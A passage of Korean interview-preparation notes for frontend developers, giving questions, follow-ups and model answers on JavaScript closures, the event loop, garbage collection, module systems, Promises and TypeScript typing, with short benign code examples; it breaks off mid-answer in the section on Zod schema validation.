### 1. 클로저(Closure)와 메모리 관리

**Q: 클로저의 개념과 대표적인 활용 패턴(은닉화, 커링 등)을 설명하고, 이로 인해 발생하는 메모리 누수 해결법을 설명해주세요.**

- **A:** 클로저란 쉽게 말해 **'자신이 생성될 당시의 환경(스코프)을 기억하는 함수'**입니다. MDN에서는 이를 "함수와 그 함수가 선언된 렉시컬 환경의 조합"이라고
  정의합니다.

  즉, 어떤 함수가 자신이 선언된 렉시컬 환경의 스코프를 기억하여, 자신이 원래 있던 스코프 밖에서 호출되어도 외부 함수의 지역 변수에 계속해서 접근할 수 있는 기능입니다. 이를
  통해
  변수의 상태를 안전하게 숨기는 정보 은닉(Private variable)이나, 매개변수를 나누어 받는 커링(Currying), 반복적인 타이머 이벤트 핸들러 생성 등에
  활용됩니다. 하지만 외부 변수를 영구적으로 참조하면 외부 함수가 종료되어도 가비지 컬렉터(GC)가 이를 수거하지 못해 메모리 누수가 발생할 수 있습니다.
    - **[꼬리 질문 1]** 클로저로 인한 메모리 누수를 해결(해제)하려면 코드를 어떻게 작성해야 하나요? => null로 강제 해제
        - **A:** 클로저가 더 이상 필요하지 않은 시점에, 참조하고 있던 변수나 클로저 함수 자체에 `null`을 할당하여 참조 연결고리를 강제로 끊어 주면 가비지
          컬렉터가 이를 인식하고 메모리를 회수합니다.
    - **[꼬리 질문 2]** 리액트(React)의 함수형 컴포넌트(Hooks) 설계에 클로저가 핵심적으로 사용되는 이유와, 클래스형 컴포넌트(`this`)와의 차이점을    => 이전 값을 기억을 못 함
      불변성 측면에서 설명해주세요.
        - **A:** 리액트가 클로저를 활용해 함수형 컴포넌트로 진화한 이유는 다음 3가지 핵심 요약으로 설명할 수 있습니다.
          **1. 왜 함수형 컴포넌트를 채택했는가? (불변성과 렌더링 캡처)**
          과거 클래스형 컴포넌트의 `this`는 항상 최신 상태를 가리키는 '가변적(Mutable)인 참조'였습니다. 이로 인해 비동기 작업 중 상태가 변경되면 의도치
          않은 최신 상태를 참조하는 버그가 발생했습니다. 반면 함수형 컴포넌트는 렌더링될 때마다 그 순간의 Props와 State를 상수로 고정(Snapshot 캡처)하여
          불변성을 보장하기 때문에, 이 문제를 구조적으로 해결할 수 있어 채택되었습니다.
          **2. 함수형 컴포넌트의 한계는 무엇이었는가? (상태 상실)**
          하지만 함수형 컴포넌트는 본질적으로 일반적인 자바스크립트 함수입니다. 함수는 실행이 끝나면 내부의 지역 변수들이 모두 메모리에서 날아가는(휘발되는) 특성이
          있습니다. 따라서 컴포넌트가 리렌더링(재실행)될 때마다 데이터가 초기화되어 '상태(State)'를 가질 수 없다는 치명적인 한계가 있었습니다.
          **3. 한계를 어떻게 극복했는가? (클로저를 활용한 Hooks의 탄생)**
          이 한계를 돌파하기 위해 리액트 팀이 고안한 것이 바로 클로저를 활용한 `Hooks(useState 등)`입니다. 리액트 엔진은 함수 외부에 상태 배열을
          숨겨두고, 컴포넌트 내부에서 `useState`를 호출할 때마다 클로저를 통해 이 외부 배열에 접근하여 값을 읽고 쓰게 만듭니다. 즉, 컴포넌트 함수 자체가 매번
          새로 실행되어 사라지더라도, **클로저 덕분에 외부 메모리에 안전하게 은닉된 진짜 상태값은 계속해서 유지하고 업데이트할 수 있게 된 것**입니다.

### 2. 이벤트 루프(Event Loop)와 태스크 큐

**Q: 이벤트 루프의 동작 원리와, 매크로 태스크 큐 및 마이크로 태스크 큐의 실행 순서 차이를 설명해주세요.**

- **A:** 이벤트 루프는 메인 스레드의 콜 스택(Call Stack)이 비어 있는지 확인한 후, 비어 있다면 태스크 큐에 대기 중인 콜백 함수를 콜 스택으로 밀어 넣어
  실행하는 역할을 합니다. 태스크 큐는 매크로 태스크 큐(`setTimeout` 등)와 마이크로 태스크 큐(`Promise.then` 등)로 나뉘는데, 이벤트 루프는 콜 스택이
  비워질 때마다 **항상 마이크로 태스크 큐를 먼저 완전히 비운 다음**, 매크로 태스크 큐에서 하나의 태스크만을 가져와 실행합니다. 즉 `Promise` 역직렬화가
  `setTimeout`보다 우선순위가 높습니다.
    - **[꼬리 질문 1]** 브라우저 렌더링 파이프라인(`requestAnimationFrame`)은 매크로 태스크와 마이크로 태스크 중 어느 타이밍에 실행되나요?
        - **A:** `requestAnimationFrame(rAF)`는 별도의 애니메이션 큐(Animation Queue)에서 관리되며, 일반적인 브라우저에서는 매크로
          태스크 하나가 끝나고 곧바로 실행되지는 않고, 브라우저의 렌더링 주기에 맞춰(약 16ms마다) 화면을 그리기 직전인 마이크로 태스크 처리 직후~렌더링 단계 이전에
          실행됩니다.
    - **[꼬리 질문 2]** 마이크로 태스크 큐 안에서 또 다른 `Promise`를 재귀적으로 무한히 호출하면 어떤 일이 발생하나요?
        - **A:** 마이크로 태스크 큐는 비워질 때까지 끝없이 실행되므로, 큐에 새로운 마이크로 태스크가 계속 적재된다면 이벤트 루프는 렌더링을 포함한 다른 모든 동작(
          매크로 태스크)을 영영 실행하지 못하고 메인 스레드가 블로킹되어 브라우저가 화면을 멈춘 채 얼어붙게 됩니다.
    - **[꼬리 질문 3] (실전 예제 문제)** 다음 코드가 실행되었을 때 콘솔에 출력되는 순서를 예측하고, 그 이유를 이벤트 루프 관점에서 설명해주세요.
      ```javascript
      console.log('A');
  
      setTimeout(() => {
        console.log('B');
      }, 0);
  
      Promise.resolve().then(() => {
        console.log('C');
      }).then(() => {
        console.log('D');
      });
  
      console.log('E');
      ```
        - **A:** 출력 순서는 `A -> E -> C -> D -> B` 입니다.
            1. 동기 코드인 `console.log('A')`와 `console.log('E')`가 먼저 콜 스택(Call Stack)에 쌓여 즉시 실행됩니다.
            2. `setTimeout`의 콜백 함수는 매크로 태스크 큐(Macro Task Queue)로 이동하여 대기합니다.
            3. `Promise.then`의 콜백 함수들은 마이크로 태스크 큐(Micro Task Queue)로 이동하여 대기합니다.
            4. 동기 코드가 모두 실행되어 콜 스택이 비워지면, 이벤트 루프는 매크로 태스크보다 우선순위가 높은 **마이크로 태스크 큐**를 먼저 확인합니다. 따라서
               `C`와 `D`가 연속해서 실행됩니다.
            5. 마이크로 태스크 큐가 완전히 비워진 후, 마지막으로 매크로 태스크 큐에 있던 `setTimeout` 콜백이 실행되어 `B`가 출력됩니다.
- **[꼬리 질문 4] (실전 변형 문제)** 만약 앞선 예제에서 `Promise.resolve()` 대신 `new Promise` 생성자를 직접 호출하면 출력 순서는 어떻게
  달라지나요?
    ```javascript
    console.log('A');

    setTimeout(() => {
      console.log('B');
    }, 0);

    new Promise((resolve) => {
      console.log('F');
      resolve();
    }).then(() => {
      console.log('C');
    });

    console.log('E');
    ```
    - **A:** 이 경우 출력 순서는 `A -> F -> E -> C -> B` 가 됩니다. `new Promise`에 전달된 **실행 함수(executor)**인
      `console.log('F')`는 비동기가 아니라 **동기적으로 즉시 실행**되기 때문에 콜 스택에 바로 올라갑니다. 오직 `resolve()`가 호출된 이후에 연결된
      `.then()`의 콜백 함수(`C`)만이 마이크로 태스크 큐로 들어가 대기하게 됩니다. 따라서 동기 코드인 `A`, `F`, `E`가 순서대로 먼저 찍히고, 콜 스택이
      비워진 후 마이크로 태스크인 `C`, 마지막으로 매크로 태스크인 `B`가 출력됩니다.
        - **[동작 원리(왜 다르게 동작하는가?)]** 자바스크립트 스펙(ECMAScript)상 `new Promise(executor)`는 객체를 생성하는 생성자
          함수이며, 내부에 전달된 `executor` 콜백은 네트워크 요청이나 타이머 같은 비동기 작업을 **지연 없이 즉시 초기화(시작)**하기 위해 생성과 동시에
          동기적으로 호출되도록 설계되어 있습니다. 반면 `.then()` 등에 등록되는 후속 처리 콜백은 프로미스의 상태가 결정된 이후에 실행되는 "구독자(
          Observer)" 역할이므로, 비동기 실행의 일관성 보장(Zalgo 방지)을 위해 스펙상 무조건 콜 스택이 비워진 후 마이크로 태스크 큐를 통해서만 실행되도록
          엄격하게 강제되기 때문입니다.

### 3. 가비지 컬렉션(GC) 원리

**Q: GC의 핵심 알고리즘인 Mark-and-Sweep에 대해 설명하고, 주의해야 할 메모리 누수 안티 패턴을 설명해주세요.**

- **A:** Mark-and-Sweep은 루트(Window 등 최상위 객체)에서부터 시작하여 참조 가능한 모든 변수나 객체들의 연결 트리를 탐색하면서 닿을 수 있는 객체들을 '
  마크(Mark) 상태'로 표시합니다. 탐색이 끝난 후, 마킹이 되지 않은 객체(아무 곳에서도 참조하지 않아 닿을 수 없는 객체)들을 가비지 컬렉터가 쓸어 담아(Sweep)
  메모리에서 해제합니다. 안티 패턴으로는 해제하지 않은 글로벌 변수 남용, 제거하지 않은 타이머(`setInterval`), DOM 참조를 지웠으나 자바스크립트 변수 어딘가에 이
  DOM 객체를 남겨두어 회수되지 못하는 경우가 있습니다.
    - **[꼬리 질문 1]** React 컴포넌트가 언마운트(Unmount)될 때 브라우저 윈도우(window) 객체 등 전역 영역에 등록한 이벤트 리스너를 지우지 않으면 왜
      메모리 누수가 발생하나요?
        - **A:** 브라우저 전역 객체인 window는 브라우저가 종료될 때까지 메모리에 남아 있습니다(Root). 이 window에 이벤트 핸들러를 등록하면서 넘긴
          콜백 함수가 컴포넌트 내부의 변수나 상태를 참조하고(클로저) 있으면, 컴포넌트가 사라져도 윈도우가 해당 콜백함수를 물고 있어 렌더링 자원들이 GC에 수거되지 않기
          때문입니다.
    - **[꼬리 질문 2]** 자바스크립트 엔진(V8)에는 Mark-and-Sweep 외에 세대별 GC 가설(Generational Hypothesis)을 통한
      Scavenge 기법이 있습니다. 짧게 설명해주세요.
        - **A:** '새롭게 만들어진 객체는 금방 쓸모없어지고, 오래 살아남은 객체는 계속 살아남을 확률이 높다'는 가설입니다. 이를 토대로 메모리를 새로운 세대(New
          Space)와 오래된 세대(Old Space)로 나누어, New Space에서는 짧게 살다 가는 객체를 빠르고 가볍게 정리(Scavenge)하고, 이 과정을 여러
          번 통과한 생존 객체들만 Old Space로 이동시켜 비용이 비싼 Mark-and-Sweep이 가끔씩만 동작하도록 최적화한 것입니다.

### 4. CommonJS vs ES Modules

**Q: 모듈 스펙인 CommonJS와 ESM의 차이점을 로딩 방식과 트리 셰이킹 관점에서 설명해주세요.**

- **A:** CommonJS(`require/module.exports`)는 로딩되는 모듈의 의존성을 런타임에 동기적으로 해석하며 디스크 I/O가 빠른 Node.js 서버
  환경에 맞춰져 있습니다. 반면 ESM(`import/export`)은 런타임 이전에 모듈의 구조(AST)를 정적(Static)으로 분석하고 모듈을 비동기식으로 가져옵니다. 이
  정적 분석 능력 덕분에 컴파일 시점에 당장 사용하지 않는 함수를 정확하게 걸러내어 빌드에서 제거하는 '트리 셰이킹(Tree Shaking)'이 ESM에서만 네이티브하게 작동
  가능합니다.
    - **[꼬리 질문 1]** CommonJS는 동적으로 모듈을 분기(`if` 문 안에서 `require`)할 수 있는데, ESM은 `import` 문을 최상단에서만 사용해야
      하는 이유는 무엇인가요?
        - **A:** ESM은 코드가 실행되기 전, 컴파일 타임에 모듈 간의 연결 구조인 종속성 그래프(Dependency Graph)를 완성해야 하기 때문입니다. 동적인
          조건문에 의존하면 실행 전에는 모듈 참조 여부를 확정 지을 수 없어 정적 분석이 깨지게 됩니다.
    - **[꼬리 질문 2]** ESM 환경에서 어쩔 수 없이 런타임에 동적인 조건으로 모듈을 불러와야 할 때는 어떻게 해야 하나요?
        - **A:** 최상단의 정적 `import` 구문 대신, `await import('module')` 문법(동적 임포트, Dynamic Import)을 사용하여
          필요할 때 비동기 프로미스 형태로 모듈 청크를 불러오면 됩니다.
    - **[꼬리 질문 3]** Node.js 환경에서 기존의 CommonJS 모듈과 새로운 ESM 모듈을 프로젝트 내에서 혼용해서 사용할 수 있나요?
        - **A:** 제한적으로 가능합니다. ESM 환경(`.mjs` 또는 `"type": "module"`)에서는 `import` 구문을 사용해 기존의 CommonJS
          모듈을 가져올 수 있습니다. 하지만 반대로 **CommonJS 환경(`.cjs`)에서 `require`를 사용해 ESM 모듈을 동기적으로 불러오는 것은 스펙상
          불가능**합니다. CommonJS에서 ESM을 가져오려면 반드시 비동기 방식인 동적 임포트(`await import()`)를 사용해야만 합니다. 이 때문에
          라이브러리를 ESM 전용으로 배포하면 구형 CommonJS 생태계에서 호환성 문제가 발생하기도 합니다.
    - **[꼬리 질문 4]** 내부적으로 모듈의 상태(값)를 내보내고 참조하는 방식(값 복사 vs 라이브 바인딩)에 어떤 차이가 있나요?
        - **A:** CommonJS는 모듈이 실행될 때 `module.exports` 객체에 값을 **'복사(Value Copy)'**하여 내보냅니다. 따라서 원본 모듈
          내부에서 상태가 변경되더라도, 이미 `require`로 값을 가져간 외부 모듈에서는 갱신된 값을 알 수 없습니다. 반면 ESM은 내보낸 값에 대한 **'읽기 전용
          참조(Live Binding)'**를 제공합니다. 원본 모듈에서 내부 변수의 값이 바뀌면, 이를 `import`해서 사용하는 쪽에서도 실시간으로 변경된 값을
          참조할 수 있습니다.
    - **[꼬리 질문 5]** 두 모듈 파일 A와 B가 서로를 참조하는 '순환 참조(Circular Dependency)' 상황일 때, 시스템별로 어떻게 다르게 동작하나요?
        - **A:** CommonJS는 런타임에 동기적으로 코드를 읽기 때문에, 순환 참조가 발생하면 무한 루프를 막기 위해 아직 실행이 완료되지 않은 모듈을 **불완전한
          빈 객체(`{}`) 형태**로 반환해버립니다. 반면 ESM은 실행 전에 정적 분석(Parsing 단계)을 통해 메모리 주소를 미리 할당하는 연결(Linking)
          작업을 먼저 수행합니다. 실시간 참조(Live Binding)를 사용하기 때문에, 코드 실행 시점(Evaluation)만 잘 통제하면 순환 참조 상황에서도
          치명적인 런타임 에러 없이 안전하게 평가될 수 있습니다.

### 5. Promise 병렬 처리

**Q: 비동기 병렬 처리를 위해 제공되는 `Promise.all`과 `Promise.allSettled`의 동작 차이점은 무엇인가요?**

- **A:** 두 메서드 모두 이터러블한 프로미스 배열을 인자로 받아 병렬로 비동기 작업을 수행합니다. 하지만 `Promise.all`은 배열 중 단 하나라도 실패(
  `reject`)하면 즉시 전체가 실패한 것으로 간주하여 에러를 던집니다(All-or-Nothing 방식). 반면 `Promise.allSettled`는 일부가 실패하더라도
  멈추지 않고 배열 내 모든 프로미스의 완료(성공 혹은 실패)를 통제된 상태까지 다 기다린 뒤, 각각의 결과 객체(
  `{status: 'fulfilled' | 'rejected', value | reason}`)를 담은 배열을 반환합니다.
    - **[꼬리 질문 1]** 화면을 그릴 때 필요한 3개의 API(유저, 프로필 이미지, 장바구니 리스트)를 불러와야 하지만 장바구니 API 1개가 실패해도 메인 화면은
      띄워야 한다면 어느 메서드를 사용해야 할까요?
        - **A:** 일부 성공 데이터라도 UI에 표출해야 하므로 거절(Reject)을 무시당하지 않는 `Promise.allSettled`를 사용하는 것이 논리적으로
          적합합니다.
    - **[꼬리 질문 2]** `Promise.race`와 `Promise.any`의 차이점은 무엇인가요?
        - **A:** `Promise.race`는 성공이든 실패든 상관없이 배열 중 **가장 먼저 끝난(Setlled)** 프로미스의 상태(resolve/reject)를
          그대로 전파합니다. 반면 `Promise.any`는 여러 실패가 있더라도 **가장 먼저 성공(Fulfilled)한** 프로미스를 찾아 응답하며, 모든 프로미스가
          실패했을 때만 에러 뭉치(AggregateError)를 발생시킵니다.

### 6. 일급 객체(First-class Object)

**Q: 함수가 1급 객체라는 조건은 무엇이며 이를 통해 가능한 디자인 패턴이 있나요?**

- **A:** 자바스크립트에서 함수는 다음과 같은 조건을 만족하는 1급 객체입니다. 1) 변수나 데이터 구조 안에 담을 수 있다. 2) 다른 함수의 인자(파라미터)로 전달될 수
  있다. 3) 다른 함수의 반환값(리턴값)으로 사용될 수 있다. 이 특성 덕분에 함수를 조작하는 고차 함수(Higher-Order Function) 설계가 가능하며, 인자를
  기억하는 클로저를 활용해 상태를 보관하는 커링(Currying), 그리고 여러 함수 파이프라인을 합성하는 함수형 프로그래밍 패턴들을 구현할 수 있습니다.
    - **[꼬리 질문 1]** 배열의 `map`, `filter`, `reduce` 역시 고차 함수라고 하는데요, 고차 함수의 정확한 정의는 무엇인가요?
        - **A:** 고차 함수란, 다른 함수를 인자(콜백 함수)로 받거나 다른 새로운 함수를 반환값으로 반환하는 구조를 가진 함수를 말합니다.
    - **[꼬리 질문 2]** 리액트(React)에서 컴포넌트도 일급 객체로 취급받나요? 어떻게 응용할 수 있나요?
        - **A:** 리액트 컴포넌트는 사실 컴포넌트를 반환하는 일반 자바스크립트 '함수'이므로 당연히 일급 객체 특성을 갖습니다. 이를 활용해 어떤 컴포넌트를 인자로
          받아 새로운 기능이나 데이터를 주입한 컴포넌트를 반환하는 HOC(Higher Order Component) 패턴을 구현할 수 있습니다.

### 7. async/await 내부 원리

**Q: `async/await`가 내부적으로 `Generator`와 `Promise`를 래핑해 비동기를 제어하는 원리를 설명해주세요.**

- **A:** `async/await` 문법은 컴파일 타임(Babel 등)에 제너레이터(Generator)로 변환됩니다. 제너레이터 함수의 `yield` 키워드를 만나면 실행을
  일시 중지하여 제어권을 외부로 넘길 수 있는데, 변환 코드는 `await`를 `yield`로 바꿔 이 시점의 비동기 작업(Promise)을 평가합니다. 외부의 실행기(
  Runner 함수) 가 `Promise.then()`을 붙여 비동기 작업이 끝난 뒤에 결과값을 들고 다시 제너레이터의 `next(결과)`를 호출하며 멈췄던 코드 실행을
  순차적으로 재개해줍니다. 이 사이클이 끝날 때까지 반복되므로 동기 코드처럼 동작하게 됩니다.
    - **[꼬리 질문 1]** `async` 함수는 반환문(return)에 `Promise` 인스턴스가 아닌 평범한 원시 값(숫자, 문자열)을 반환해도 에러가 나지 않나요?
        - **A:** 네, 에러가 나지 않습니다. `async` 키워드가 붙은 함수는 결과값이 일반 값일지라도 내부 엔진이 이를 자동으로
          `Promise.resolve(값)`으로 감싸서 항상 프로미스 형태로 반환하도록 규정되어 있기 때문입니다.
    - **[꼬리 질문 2]** `try-catch`로 에러 처리를 할 때 일반 `Promise.then().catch()`와 비교하여 `async/await` 문법이 갖는
      장점은 무엇인가요?
        - **A:** 일반 프로미스 체이닝에서는 비동기 에러(`catch()`)와 동기 로직의 에러 핸들링 영역이 서로 분리되지만, `async/await`에서는 비동기
          통신 에러 코드는 물론이고 JSON 파싱 에러와 같은 흔한 동기적 에러 코드까지도 모두 동기 코드처럼 하나의 거대한 `try-catch` 블록 스택에서 직관적으로
          포착되어 통합 처리가 가능하다는 점입니다.

### 8. TypeScript 도입의 장점과 컴파일 원리

**Q: TypeScript를 도입했을 때 실무에서 얻을 수 있는 특장점과 컴파일(변환) 과정을 설명해주세요.**

- **A:** 가장 큰 장점은 정적 타입 체킹을 통해 런타임이 아닌 '컴파일(코드 작성) 타임'에 에러를 미리 발견할 수 있다는 점입니다. 이를 통해 런타임 오류(예:
  `undefined`의 프로퍼티 참조)를 예방하고, 개발 툴(IDE)의 자동 완성과 리팩토링 지원을 극대화하여 생산성을 높입니다. TypeScript는 브라우저가 직접 이해할
  수 없으므로, TSC(TypeScript Compiler)나 Babel, esbuild 등을 통해 AST(추상 구문 트리)로 파싱된 후, 타입 검사 단계를 거쳐 타입 정보(
  인터페이스, 제네릭 등)가 모두 지워진 순수 JavaScript(.js) 코드로 트랜스파일(Transpile) 및 방출(Emit)됩니다.
    - **[꼬리 질문 1]** "타입 정보가 지워진다(Type Erasure)"는 속성 때문에 런타임에서 발생할 수 있는 문제점은 무엇이 있나요?
        - **A:** 인터페이스나 타입 추론 정보는 빌드 후 자바스크립트에 존재하지 않으므로, 런타임에 외부(API 응답 등)에서 예상과 다른 데이터가 들어와도
          TypeScript 타입 가드가 에러를 뱉지 못합니다.
    - **[꼬리 질문 2]** 그러면 런타임에 들어오는 외부 데이터의 타입을 어떻게 안전하게 보장할 수 있을까요?
        - **A:** `Zod`, `Yup`, `Joi`와 같은 런타임 스키마 밸리데이션 라이브러리를 사용해, API I/O 경계에서 데이터 스키마를 동적으로 검증함과
          동시에 TypeScript 타입으로 추론(`z.infer`)하는 방식을 병행해야 합니다.

### 9. `unknown` vs `any`

**Q: `unknown`과 `any`의 차이점을 할당 및 안전성 관점에서 비교하고 `unknown` 사용을 지향해야 하는 이유를 설명해주세요.**

- **A:** 두 타입 모두 자바스크립트의 유연성을 위해 "어떤 종류의 구조든 다 들어올 수 있다"는 최상위 타입(Top Type)입니다. 하지만 `any`는 그 자체로
  타입스크립트의 타입 검사기 동작을 무시(Bypass)해 버리기 때문에 할당하거나 메서드를 실행할 때 아무런 에러도 띄우지 않아 런타임 오류로 뻥 뚫리게 됩니다. 반면
  `unknown`은 무언가 할당은 가능하지만, 사전에 타입 가드(`typeof`, `if` 분기)로 값이 문자열인지, 특정한 객체인지 명확히 좁히지 않고는 내부 프로퍼티를
  억지로 꺼내 쓰거나 연산하는 것을 컴파일러가 강력하게 막아(금지시켜) 줍니다. 즉, 타입 시스템 체계를 방어하면서 모든 값을 수용해야 할 때 `any`보다는 안전한
  `unknown`을 권장합니다.
    - **[꼬리 질문 1]** 반대로 `unknown` 타입에 일반 문자열이나 숫자 변수를 할당할 수는 없나요?
        - **A:** 아닙니다. 할당은 자유롭게 가능합니다. 반대의 경우, 즉 `unknown` 값을 다른 구체적 타입의 변수에 도로 할당하거나, 그 객체의 메서드를 '
          추론 없이' 호출하려고 시도할 때 에러가 발생합니다.
    - **[꼬리 질문 2]** 함수의 반환값이나 Promise의 응답값으로 `void` 대신 빈 객체 `{}`를 쓰면 어떻게 되나요?
        - **A:** 타입스크립트에서 빈 객체 타입 `{}`는 프로퍼티가 비어있는 모든 객체뿐만 아니라, `null`과 `undefined`를 제외한 거의 모든 원시
          리터럴 값까지 수용(Bypass)하는 매우 느슨한 구조라 `any`와 비슷한 약점이 생깁니다. 목적에 따라 제한된 텅 빈 응답이라면
          `Record<string, never>`나 `unknown`을 명시해야 합니다.

### 10. `never` 타입과 Exhaustiveness Checking

**Q: `never` 타입은 어떤 경우에 추론되거나 사용되며, switch 문 안에서 Exhaustiveness Checking 패턴이 무엇인지 설명해주세요.**

- **A:** `never` 타입은 함수 안에서 영원히 끝나지 않는 무한 루프(`while(true)`)가 있거나 강제로 에러를 던져 정상적으로 종료할 수 없는 반환값, 혹은
  유니온 타입 교차로 인해 절대 존재할 수 없는 모순된 타입(`string & number`)일 때 컴파일러에 의해 추론됩니다. 실무에서는 식별 가능한 유니온 타입을 넘겨받아
  `switch` 문으로 케이스를 돌릴 때, `default` 문에 들어오는 남겨진 변수를 `never` 타입 매개변수를 담은 예외 함수에 할당하는 **Exhaustiveness
  Checking**을 겁니다. 이렇게 하면 나중에 개발자가 새로운 유니온 타입을 추가하고 `switch` 로직을 까먹고 갱신하지 않았을 때, 처리되지 못한 타입이
  `default` 구문으로 빠져 내려와 컴파일 에러를 강렬하게 발생시키므로 버그를 막을 수 있습니다.

  **[Exhaustiveness Checking 예시 코드]**
  ```typescript
  type Shape = 'circle' | 'square';

  function getArea(shape: Shape) {
    switch (shape) {
      case 'circle':
        return Math.PI * 2;
      case 'square':
        return 4;
      default:
        // 만약 Shape 타입에 'triangle'이 추가되었으나 case 로직을 추가하지 않았다면,
        // 이곳으로 'triangle' 타입이 내려오게 되고, 이는 never 타입인 변수에 할당할 수 없으므로 컴파일 에러를 강렬하게 발생시킵니다.
        const _exhaustiveCheck: never = shape;
        return _exhaustiveCheck;
    }
  }
  ```
    - **[꼬리 질문 1]** `void`와 `never`의 반환 상태 차이는 무엇일까요?
        - **A:** `void`는 함수가 동작을 무사히 정상 종료하긴 했지만 단지 `return undefined` 값을 암시만 하고 끝났을 때이며, `never`는
          함수의 사이클이 무사히 종료(리턴)되는 것 자체가 절대 불가능하다는 구조적 차이가 있습니다.
    - **[꼬리 질문 2]** 빈 배열 `const arr = []`를 어떠한 타입 지정 없이 선언하면 추론 엔진이 요소 타입으로 무엇을 채우나요?
        - **A:** TypeScript 컴파일러(옵션에 따라)는 빈 배열 안의 요소의 정체를 전혀 알 수 없을 때(Implicit) `any[]`나 궁극적으로
          `never[]` 타입으로 일시적으로 좁혀버립니다.

### 11. 타입 단언(Type Assertion, `as`)과 타입 선언(Type Declaration, `:`)

**Q: 두 문법의 차이점과 컴파일러의 잉여 속성 체킹(Excess Property Checking) 동작 관점에서 안전성 차이를 비교해주세요.**

- **A:** 타입 선언(`const a: T`)은 이 객체가 철저하게 `T`라는 타입을 모두 준수하고 있는지를 엄격하게 검증해줍니다. 만약 `T` 인터페이스에 없는 쓸데없는 '
  잉여 속성(Excess Property)'이 포함되거나 빼먹은 값이 있다면 즉시 불만(Error)을 제기합니다. 반면 타입 단언(`const a = {} as T`)은
  개발자가 "내 눈이 컴파일러보다 우월하니 내 멋대로 이건 무조건 `T` 타입이라고 간주할 것이다"라고 타입 체커의 입을 막아버리는 강압적인 연산입니다. 따라서 인터페이스 스펙과
  달라도 아무런 에러가 나지 않아, 향후 런타임 과정에서 치명적인 참조 파탄의 맹점을 안게 되므로 지양해야 합니다.
    - **[꼬리 질문 1]** 그러면 타입 단언(`as`)은 언제 어쩔 수 없이 써야만 하나요?
        - **A:** 코드 작성 시점의 컴파일러는 도무지 알 방법이 없고, 브라우저가 제공하는 API의 내부에서 데이터가 날아올 때(예:
          `document.getElementById('root') as HTMLDivElement`)나, 강제 캐스팅 외에는 뾰족한 수가 없을 때 예외적으로만 쓰입니다.
    - **[꼬리 질문 2]** 프론트엔드 환경에서 논-널 어설션(`!`, Non-null Assertion) 연산자는 어떤 단언 효과를 발휘하나요?
        - **A:** 변수나 프로퍼티의 꼬리에 `!`를 붙이면, 해당 값이 어떠한 경우에도 무조건 존재하며 절대 `null`이나 `undefined`가 아닐 것이라고
          타입스크립트 엔진에게 강제로 단언하고 체킹을 Bypassing시킵니다. 이 역시 런타임 오류로 뻗을 수 있는 주범이 됩니다.

### 12. 모듈 스펙 (네임스페이스 vs ES/파일 기반 모듈)

**Q: TypeScript의 구형 시스템인 네임스페이스(Namespace)와 모던 ESM 환경에서의 파일 모듈 방식 차이를 설명해주세요.**

- **A:** 네임스페이스(`namespace` 키워드)는 전역 스코프가 오염되는 것을 막기 위해 자바스크립트의 IIFE(즉시 실행 함수) 패턴을 본떠서 객체 내부에 변수나
  함수를 캡슐화해 묶는 구형 타입스크립트 기술입니다. 과거 모듈 번들러가 없고 `<script src>`로만 로딩하던 시절에 주로 로컬 로직을 분리하기 쓰였습니다. 현재는 언어
  표준이 ESM 스펙 기반으로 통일되고, 파일 자체가 독립적인 모듈 스코프 영역으로 취급되므로, 구조적 분리가 훨씬 간단하고 트리 셰이킹 등 의존성 관리가 완벽하게 되는
  `import/export` 모듈 체제로 모던 프론트엔드 아키텍처가 완전히 전환되었습니다.
    - **[꼬리 질문 1]** 현재도 네임스페이스는 아예 안 쓰나요? 어떤 상황에선 사용되기도 하나요?
        - **A:** 보통은 개발 중인 소스 코드(src) 내부에서는 쓰지 않지만, 오래된 `.d.ts` 타입 선언 모듈 파일을 정의하거나 자바의 써드파티 전역 변수를
          주입하는 등의 `declare global` 확장을 할 때 특수한 용법으로 사용되기도 합니다.
    - **[꼬리 질문 2]** 외부 라이브러리(`lodash` 등)에 대한 타입이 정의가 따로 존재하지 않을 때 어떻게 처리하나요?
        - **A:** 최상단에 `foo.d.ts` 같은 사용자를 위한 정의 파일을 추가한 후, 간단하게 `declare module "lodash";` 선언을 명시해주면
          모듈 로딩 에러의 입막음 처리를 할 수 있으며 그 안쪽을 전부 `any` 상태로 받아들이게 됩니다.

### 13. 클래스 접근 제어자와 은닉화 (# vs private)

**Q: 클래스의 접근 제어자(`public`, `private`, `protected`)와 JS 기본 문법인 `#` (Private field)의 차이점을 설명해주세요.**

- **A:** 객체지향 설계를 위해 타입스크립트는 멤버를 보호하는 키워드를 지원합니다. `public`은 아무 곳에서나 접근 가능, `private`은 선언된 부모 클래스 자기
  자신 내부에서만 접근 가능(자식 상속 불능), `protected`는 선언된 위치와 자신을 상속(확장)하는 자손 클래스 내부 공간까지는 호출을 허락하는 기법입니다. 그러나
  타입스크립트의 이 문법들은 "컴파일 과정(경고)"에서만 동작할 뿐 트랜스파일 후 일반 `.js`로 변환되면 전부 퍼블릭(Public) 성질로 발가벗겨집니다. 반면, 최신
  자바스크립트 표준(ES2022)의 해시(`#`) 기호를 붙인 프라이빗 변수는 자바스크립트 엔진단(런타임) 자체에서 클래스 외부의 무단 침해 접근 시 하드(Hard)한 런타임
  에러를 뿜어냅니다.
    - **[꼬리 질문 1]** 그러면 무조건 하드 에러를 내는 JS `#` 기호를 쓰는 것이 타입스크립트 `private`보다 훨씬 우월한가요?
        - **A:** 무조건 그렇지는 않습니다. 해시 기호를 사용하면 그에 상응하는 하위 호환 폴리필 코드가 번들에 덕지덕지 추가될 우려가 있으며, `protected`의
          상속 우대 기능 등을 지원하지 않기 때문에 일반적인 프론트엔드 환경에서는 개발 단계의 체킹만 목적이라면 타입스크립트 `private`으로 훌륭히 은닉화 통제가
          가능합니다.
    - **[꼬리 질문 2]** 타입스크립트의 `readonly` 특징을 클래스 멤버 변수에 정의하면 `private`처럼 내부에서만 쓸 수 있다는 것인가요?
        - **A:** 아닙니다. `readonly`는 외부에서 공개되어 읽고 접근(Get)하는 것은 자유롭지만, 단지 한 번 할당(초기화)된 값을 다시 덮어쓰거나
          오버라이딩(Set 및 Reassign)하는 기능을 완전히 틀어막는(Immutability) 용도입니다.

### 14. 스키마 밸리데이션 통제 (Zod 등)

**Q: 정적 타입 시스템 외에 Zod나 Yup 같은 런타임 밸리데이션(Schema Validation) 라이브러리가 API 응답처리에 필수적으로 요구되는 이유를 설명해주세요.**

- **A:** 타입스크립트는 파일에 작성된 소스 영역에서만 에러를 잡아내는 '정적 컴파일러'에 불과합니다. 서버에서 데이터를 통신(Fetch) 받았을 때, 코더가 이 데이터들을
